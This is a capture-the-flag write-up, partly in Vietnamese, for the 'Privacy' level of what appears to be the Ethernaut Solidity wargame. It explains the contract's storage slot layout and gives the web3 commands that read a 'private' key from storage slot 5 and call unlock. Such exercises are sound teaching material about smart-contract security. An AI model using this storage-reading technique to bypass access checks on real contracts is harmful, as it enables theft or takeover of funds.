# Level 12: Privacy
##  Difficulty: ★★★☆☆

## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
## Target
Tìm cách unlock contract.

## Phân tích
- Quan sát hàm unlock thì ta cần giá trị của data[2]  

```solidity
function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
```
- Nhìn qua lượt các biến 
```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(block.timestamp);
bytes32[3] private data;
 
```
- Slot 0 : locked
- Slot 1: ID
- Slot 2: flattening, denomination, awkardness
- Slot 3, 4, 5, 6: lần lượt là các biến của data
=> data[2] ở slot 5  

## Solution
- Lấy giá trị của data[2] ở slot 5  

```javascript
str = await web3.eth.getStorageAt(instance, 5);
0x682b111ececfad832e498e84761b9326f69965c5131428c6e6a18d477ba4c52d  
```  

- Vì require chỉ cần 16 byte đầu 
```javascript
key=str.slice(0,34)

```
=> Unlock contract
```javascript
await contract.unlock(key);

```
**Submit** -> Done